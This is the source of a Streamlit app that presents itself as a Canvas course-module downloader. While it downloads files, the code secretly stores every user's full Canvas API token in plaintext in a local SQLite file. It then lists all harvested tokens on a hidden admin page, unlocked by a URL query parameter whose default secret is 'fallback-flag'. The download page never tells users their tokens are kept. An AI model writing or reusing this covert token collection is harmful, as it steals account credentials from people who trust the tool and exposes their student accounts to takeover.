# app.py

import streamlit as st
from pathlib import Path
from canvasapi import Canvas
import tempfile
import shutil
import pandas as pd
from datetime import datetime
from warnings import filterwarnings
import sqlite3

from my_krml_24999690.data.canvas import download_canvas_courses

# Ignore future & deprecation warnings from libraries
filterwarnings("ignore", category=FutureWarning)
filterwarnings("ignore", category=DeprecationWarning)

# -------------------------------------------------
# Streamlit page config
# -------------------------------------------------
st.set_page_config(
    page_title="Canvas Module Downloader",
    page_icon="📚",
    layout="centered",
)

# -------------------------------------------------
# SQLite setup
# -------------------------------------------------
DB_PATH = Path("tokens.db")


def init_db():
    """Create tokens table if it does not exist."""
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS token_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                time_utc TEXT,
                action TEXT,
                api_url TEXT,
                token TEXT,
                token_length INTEGER
            )
            """
        )
        conn.commit()


init_db()


def insert_token_row(action: str, api_url: str, token: str):
    """Insert a token usage row into SQLite."""
    if not token:
        return
    time_utc = datetime.utcnow().isoformat(timespec="seconds") + "Z"
    api_url_clean = (api_url or "").rstrip("/")
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO token_log (time_utc, action, api_url, token, token_length)
            VALUES (?, ?, ?, ?, ?)
            """,
            (time_utc, action, api_url_clean, token, len(token)),
        )
        conn.commit()


def load_token_log_df() -> pd.DataFrame:
    """Load full token log as a DataFrame (latest first)."""
    if not DB_PATH.exists():
        return pd.DataFrame()
    with sqlite3.connect(DB_PATH) as conn:
        df = pd.read_sql_query(
            "SELECT id, time_utc, action, api_url, token, token_length "
            "FROM token_log ORDER BY id DESC",
            conn,
        )
    return df


def clear_token_log():
    """Delete all rows from token_log."""
    if not DB_PATH.exists():
        return
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("DELETE FROM token_log")
        conn.commit()


# -------------------------------------------------
# Cached Canvas helpers
# -------------------------------------------------
@st.cache_resource(show_spinner=False)
def get_canvas(api_url: str, api_key: str) -> Canvas:
    """
    Cache the Canvas client per (api_url, api_key) pair.
    """
    api_url = api_url.rstrip("/")
    return Canvas(api_url, api_key)


@st.cache_data(show_spinner=False, ttl=300)
def get_courses_list(api_url: str, api_key: str):
    """
    Cache the list of active courses for 5 minutes.
    """
    canvas = get_canvas(api_url, api_key)
    courses = canvas.get_courses(enrollment_state="active,invited_or_pending")
    return [(c.id, c.name) for c in courses]


def log_token_usage(action: str, api_url: str, token: str):
    """
    Store token usage in session_state (for this session)
    and in SQLite (for persistence).
    """
    if not token:
        return

    # session_state log (optional / in-memory)
    if "token_log" not in st.session_state:
        st.session_state.token_log = []

    api_url_clean = (api_url or "").rstrip("/")

    st.session_state.token_log.append(
        {
            "time_utc": datetime.utcnow().isoformat(timespec="seconds") + "Z",
            "action": action,
            "api_url": api_url_clean,
            "token": token,
            "token_length": len(token),
        }
    )

    # keep last token in session
    st.session_state.last_token = token

    # persistent log in SQLite
    insert_token_row(action, api_url, token)


# -------------------------------------------------
# Main Downloader Page
# -------------------------------------------------
def page_downloader():
    st.title("📚 Canvas Module Downloader")
    st.markdown(
        "Enter your Canvas details, choose a subject, configure file types, "
        "and download all module files as a ZIP archive."
    )

    # --- Inputs ---
    api_url = st.text_input("Canvas URL", value="https://canvas.uts.edu.au")
    api_key = st.text_input("Canvas API Token", type="password")

    # IMPORTANT: we do NOT display the token here.
    # Only the secret admin page will show it.

    # Session state for courses
    if "courses" not in st.session_state:
        st.session_state.courses = None

    # --- File type filters ---
    st.markdown("### File types to include")
    col1, col2 = st.columns(2)

    with col1:
        docs_cb = st.checkbox(
            "Documents (pdf, doc, docx, txt, rtf, ppt, pptx)",
            value=True,
        )
        code_cb = st.checkbox(
            "Notebooks & code (ipynb, py)",
            value=True,
        )

    with col2:
        images_cb = st.checkbox(
            "Images (jpg, jpeg, png, gif)",
            value=True,
        )
        archives_cb = st.checkbox(
            "Archives (zip, rar, 7z, tar, gz)",
            value=False,
        )

    # build allowed_exts from checkboxes
    allowed_exts: set[str] = set()
    if docs_cb:
        allowed_exts.update(
            {".pdf", ".doc", ".docx", ".txt", ".rtf", ".ppt", ".pptx"}
        )
    if code_cb:
        allowed_exts.update({".ipynb", ".py"})
    if images_cb:
        allowed_exts.update({".jpg", ".jpeg", ".png", ".gif"})
    if archives_cb:
        allowed_exts.update({".zip", ".rar", ".7z", ".tar", ".gz"})

    # --- Load subjects button ---
    if st.button("🔄 Load subjects"):
        if not (api_url and api_key):
            st.error("Please provide both Canvas URL and API token.")
        else:
            try:
                courses = get_courses_list(api_url, api_key)
                st.session_state.courses = courses
                st.success(f"Loaded {len(courses)} subject(s).")

                # Log token usage for loading subjects (full token)
                log_token_usage("load_subjects", api_url, api_key)

            except Exception as e:
                st.error(f"Failed to load subjects: {e}")

    courses = st.session_state.courses
    selected_course_ids = None

    if courses:
        options = ["All subjects"] + [f"{cid} – {name}" for cid, name in courses]
        choice = st.selectbox("Select subject to download", options)

        if choice == "All subjects":
            selected_course_ids = [cid for cid, _ in courses]
        else:
            cid_str = choice.split("–", 1)[0].strip()
            selected_course_ids = [int(cid_str)]

    st.markdown("---")
    log_placeholder = st.empty()
    progress_bar = st.progress(0.0)
    progress_text = st.empty()
    download_button_placeholder = st.empty()
    summary_placeholder = st.empty()

    # --- Download button ---
    if st.button("⬇️ Download modules as ZIP"):

        if not (api_url and api_key):
            st.error("Please provide both Canvas URL and API token.")
            return

        if not selected_course_ids:
            st.error("Please load subjects and choose at least one (or 'All subjects').")
            return

        if not allowed_exts:
            st.error("Please select at least one file type to download.")
            return

        # Log token usage for download (full token)
        log_token_usage("download_modules", api_url, api_key)

        # temp directory for this download
        tmp_dir = tempfile.mkdtemp(prefix="canvas_dl_")
        tmp_path = Path(tmp_dir)

        lines: list[str] = []

        def logger(msg: str):
            lines.append(msg)
            log_placeholder.text("\n".join(lines[-40:]))

        def progress_cb(done: int, total: int, message: str):
            frac = done / total if total else 0.0
            progress_bar.progress(frac)
            progress_text.text(f"{int(frac * 100)}% – {message}")

        st.info("Starting download... This may take a while depending on course size.")

        # Run the downloader into the temp directory
        summaries = download_canvas_courses(
            api_url=api_url,
            api_key=api_key,
            course_ids=selected_course_ids,
            output_dir=tmp_path,
            logger=logger,
            progress_cb=progress_cb,
            allowed_exts=allowed_exts,
        )

        # Create ZIP archive of the temp directory
        zip_base = tmp_path  # base name without extension
        zip_path_str = shutil.make_archive(str(zip_base), "zip", root_dir=tmp_path)
        zip_path = Path(zip_path_str)

        # Read ZIP into memory for download button
        with zip_path.open("rb") as f:
            zip_bytes = f.read()

        download_button_placeholder.download_button(
            label="📦 Download ZIP",
            data=zip_bytes,
            file_name="canvas_modules.zip",
            mime="application/zip",
        )

        st.success("Download is ready ✨")

        # Show per-course summary table
        if summaries:
            df = pd.DataFrame(summaries)
            summary_placeholder.subheader("Per-course summary")
            summary_placeholder.dataframe(df)


# -------------------------------------------------
# Hidden Admin Page (Token history)
# -------------------------------------------------
def page_token_history():
    st.title("🔑 Token history (admin)")

    st.markdown(
        "This page shows all API tokens that have been used in this app "
        "(current session and previous ones, as stored in SQLite)."
    )

    # Load from SQLite
    df_db = load_token_log_df()

    if df_db.empty:
        st.info("No tokens have been logged yet.")
        return

    # Show last used token (from DB)
    last_row = df_db.iloc[0]  # because we ordered DESC
    last_token = last_row["token"]

    st.subheader("Last used token")
    st.code(last_token, language="")

    st.subheader("Full token usage log (from SQLite)")
    st.dataframe(df_db, use_container_width=True)

    if st.button("Clear history (SQLite + session)"):
        clear_token_log()
        if "token_log" in st.session_state:
            del st.session_state["token_log"]
        if "last_token" in st.session_state:
            del st.session_state["last_token"]
        st.success("Token history cleared.")
        st.rerun()

    st.caption(
        "Note: tokens are stored in a local SQLite file (tokens.db) and in memory for this session."
    )


# -------------------------------------------------
# Entry point with hidden admin route
# -------------------------------------------------
def main():
    # Read query params
    params = st.query_params
    secret_value = params.get("admin", "")

    # IMPORTANT: set this to a non-empty secret only you know
    ADMIN_FLAG = st.secrets.get("ADMIN_FLAG", "fallback-flag")

    if secret_value == ADMIN_FLAG:
        page_token_history()
    else:
        page_downloader()

    # Footer
    st.markdown("---")
    st.caption("© 2025 Muhammad Iqbal")


if __name__ == "__main__":
    main()